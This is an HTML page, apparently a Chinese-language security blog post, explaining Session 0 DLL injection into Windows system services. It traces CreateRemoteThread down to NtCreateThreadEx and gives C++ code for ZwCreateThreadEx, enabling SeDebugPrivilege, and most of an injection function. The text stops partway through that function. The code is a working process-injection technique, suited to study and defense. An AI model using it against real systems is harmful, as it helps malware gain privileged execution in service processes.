@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言当我们使用远程线程注入将dll注入至系统服务进程中往往会失败，这是因为大多数系统服务都是在Session0中运行的 “Session 0”是Windows操作系统中的一个特殊的会话，专门用于运行系统服务和其他在用户登录之前就需要运行的程序。从Windows Vista和Windows Server 2008开始，为了提高安全性，Windows将用户和系统服务分隔在不同的会话中。具体来说，所有的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chensicha‘s blogs">
+<meta property="og:url" content="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Chensicha‘s blogs">
+<meta property="og:description" content="前言当我们使用远程线程注入将dll注入至系统服务进程中往往会失败，这是因为大多数系统服务都是在Session0中运行的 “Session 0”是Windows操作系统中的一个特殊的会话，专门用于运行系统服务和其他在用户登录之前就需要运行的程序。从Windows Vista和Windows Server 2008开始，为了提高安全性，Windows将用户和系统服务分隔在不同的会话中。具体来说，所有的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/07be2c8ed1a09d94715df0ee9e2f9fbd225360e3.png@855w_627h_progressive.webp">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611165350503.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611165720925.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611170023100.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611170146936.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611174832964.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611175907620.png">
+<meta property="og:image" content="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/session0%E6%B3%A8%E5%85%A5/image-20230611233900720.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611233625460.png">
+<meta property="og:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/image-20230611234019447.png">
+<meta property="og:image" content="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/session0%E6%B3%A8%E5%85%A5/image-20230611234104530.png">
+<meta property="article:published_time" content="2024-04-29T07:43:25.469Z">
+<meta property="article:modified_time" content="2023-08-26T09:09:52.000Z">
+<meta property="article:author" content="Xiao Ni">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/session0%E6%B3%A8%E5%85%A5/07be2c8ed1a09d94715df0ee9e2f9fbd225360e3.png@855w_627h_progressive.webp">
+
+<link rel="canonical" href="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Chensicha‘s blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chensicha‘s blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+      <meta itemprop="name" content="Xiao Ni">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chensicha‘s blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们使用远程线程注入将dll注入至系统服务进程中往往会失败，这是因为大多数系统服务都是在Session0中运行的</p>
+<p>“Session 0”是Windows操作系统中的一个特殊的会话，专门用于运行系统服务和其他在用户登录之前就需要运行的程序。从Windows Vista和Windows Server 2008开始，为了提高安全性，Windows将用户和系统服务分隔在不同的会话中。具体来说，所有的服务和系统任务都在Session 0中运行，而所有用户交互任务都在其他会话中运行</p>
+<p>“Session 0注入”一般指的是把一个程序（通常是一个恶意程序）注入到Session 0的过程。因为Session 0有许多特权，所以如果恶意程序能够成功注入到Session 0，就可以获得比正常用户更高的权限，从而进行更多的恶意操作</p>
+<p>然而，由于Windows Vista和后续版本的Windows的安全性提高，使得Session 0注入变得更加困难。尤其是，Session 0是隔离的，不能直接与用户的图形会话进行交互</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/07be2c8ed1a09d94715df0ee9e2f9fbd225360e3.png@855w_627h_progressive.webp" alt="image">	</p>
+<p>​		</p>
+<h1 id="远程线程注入函数调用流程"><a href="#远程线程注入函数调用流程" class="headerlink" title="远程线程注入函数调用流程"></a>远程线程注入函数调用流程</h1><h2 id="1-CreateRemoteThreadStub"><a href="#1-CreateRemoteThreadStub" class="headerlink" title="1.CreateRemoteThreadStub"></a>1.CreateRemoteThreadStub</h2><p><code>CreateRemoteThreadStub</code>是在<code>kernel32.dll</code>中，用于对<code>CreateRemoteThread</code>函数的封装，对<code>CreateRemoteThread</code>的参数进行处理，由原来的7个参数扩展到8个参数，并对<code>dwCreationFlags</code>参数进行安全处理</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165350503.png" alt="image-20230611165350503"></p>
+<h2 id="2-CreateRemoteThread"><a href="#2-CreateRemoteThread" class="headerlink" title="2.CreateRemoteThread"></a>2.CreateRemoteThread</h2><p><code>CreateRemoteThread</code>函数位于KernelBase.dll中，最终调用了<code>NtCreateThreadEx</code>函数</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165720925.png" alt="image-20230611165720925"></p>
+<h2 id="3-NtCreateThread"><a href="#3-NtCreateThread" class="headerlink" title="3.NtCreateThread"></a>3.NtCreateThread</h2><p><code>NtCreateThread</code>是内核级别的函数，它是属于NTDLL库中的一部分。NTDLL库中的函数主要是由操作系统的内核（即内核模式）使用的，而用户模式的程序一般不直接调用这些函数</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170023100.png" alt="image-20230611170023100"></p>
+<p><code>mov eax, 0C7h</code>：将值<code>0c7h</code>移动至eax寄存器，表示执行编号为<code>0c7h</code>的系统调用</p>
+<p><code>syscall</code>：这是执行系统调用的指令。系统调用编号和参数应在此之前已被设置好（在这种情况下，通过将 <code>0xC7</code> 和 <code>rcx</code> 的内容移动到 <code>eax</code> 和 <code>r10</code>）</p>
+<p>这段代码表示执行编号为 <code>0xC7</code> 的系统调用，如果 <code>ds:7FFE0308h</code> 的最低位被设置，那么在系统调用前会先跳转到另一段代码（位于 <code>loc_1800A0525</code>，使用<code>int 2Eh</code>中断进入内核）。如果该位未被设置，那么直接执行系统调用</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170146936.png" alt="image-20230611170146936"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以下是<code>CreateRemoteThread</code>函数的调用流程图</p>
+<ol>
+<li>应用程序调用 <code>CreateRemoteThread</code>，这是一个由 <code>kernel32.dll</code> 提供的 Win32 API，用于在另一个进程的地址空间中创建新线程。</li>
+<li><code>CreateRemoteThread</code> 内部调用 <code>CreateRemoteThreadEx</code>，这是一个由 <code>KernelBase.dll</code> 提供的更底层的 API，提供了更多的选项，比如可以指定安全描述符，可以控制新线程是否立即开始运行等</li>
+<li><code>CreateRemoteThreadEx</code> 内部调用 <code>NtCreateThreadEx</code>，这是由 <code>ntdll.dll</code> 提供的 Native API，也是用户空间可以直接调用的最底层的 API。</li>
+<li><code>NtCreateThreadEx</code> 函数设置好系统调用的参数后，执行 <code>syscall</code> 指令，切换到内核模式。</li>
+<li>在内核模式下，根据 <code>syscall</code> 提供的系统调用编号，在 SSDT 表中查找对应的内核函数。</li>
+<li>执行 SSDT 表中找到的函数，完成线程的创建。</li>
+</ol>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611174832964.png" alt="image-20230611174832964">	</p>
+<h1 id="普通线程和远程线程的区别"><a href="#普通线程和远程线程的区别" class="headerlink" title="普通线程和远程线程的区别"></a>普通线程和远程线程的区别</h1><p>可以看到普通线程函数<code>CreateThread</code>也调用了<code>CreateRemoteThread</code>函数，只不过其线程句柄参数的值为-1，而远程线程的句柄参数为一个具体的值</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611175907620.png" alt="image-20230611175907620"></p>
+<h1 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h1><h2 id="1-ZwCreateThread函数的声明及定义"><a href="#1-ZwCreateThread函数的声明及定义" class="headerlink" title="1.ZwCreateThread函数的声明及定义"></a>1.<code>ZwCreateThread</code>函数的声明及定义</h2><p>当我们使用DLL注入系统服务的进程时会失败，失败的原因在于，当<code>CreateRemoteThread</code>函数尝试在Session 0隔离的系统服务进程中注入DLL时，它通过调用<code>ZwCreateThread</code>函数创建远程线程，其中第七个参数<code>CreateThreadFlags</code>被设置为1。这意味着创建的线程在完成后将被挂起，无法被恢复，因此导致注入失败。为了成功注入，需通过调用<code>ZwCreateThreadEx</code>函数将此参数修改为0。</p>
+<p>以下是对<code>ZwCreateThreadEx</code>函数的描述：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE ThreadHandle,  <span class="comment">//输出参数，新创建的线程的句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ACCESS_MASK DesiredAccess,  <span class="comment">//所需的访问权限标志，例如PROCESS_ALL_ACCESS代表全部权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID ObjectAttributes,  <span class="comment">//对象的属性，通常为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE ProcessHandle,  <span class="comment">//所创建线程将要在其内运行的进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PTHREAD_START_ROUTINE StartRoutine,  <span class="comment">//新线程的开始地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Argument,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG CreateFlags,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//ZeroBits, StackSize, MaximumStackSize: 这些参数一般设置为0，表示使用默认的堆栈大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG_PTR ZeroBits,  </span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    IN PPS_ATTRIBUTE_LIST AttributeList  <span class="comment">//用于传递更高级的线程属性，通常设置为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于<code>ZwCreateThread</code>函数未在官方文档中说明，所以我们需对<code>ZwCreateThread</code>函数进行声明：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后通过<code>GetProcAddress</code>函数来获取这个函数</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-提升进程权限"><a href="#2-提升进程权限" class="headerlink" title="2.提升进程权限"></a>2.提升进程权限</h2><p>如果要将dll注入至系统服务进程，还需提升当前进程的权限，以下是提权函数的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提权函数，启用调试特权</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-Session0注入函数"><a href="#3-Session0注入函数" class="headerlink" title="3.Session0注入函数"></a>3.Session0注入函数</h2><p>此函数的主要作用是在Session0中注入指定的DLL。其步骤包括提权、打开目标进程、在目标进程中分配内存并写入DLL路径、获取LoadLibraryA函数地址、获取ZwCreateThreadEx函数地址、在目标进程中创建线程运行LoadLibraryA函数，最后释放资源</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span 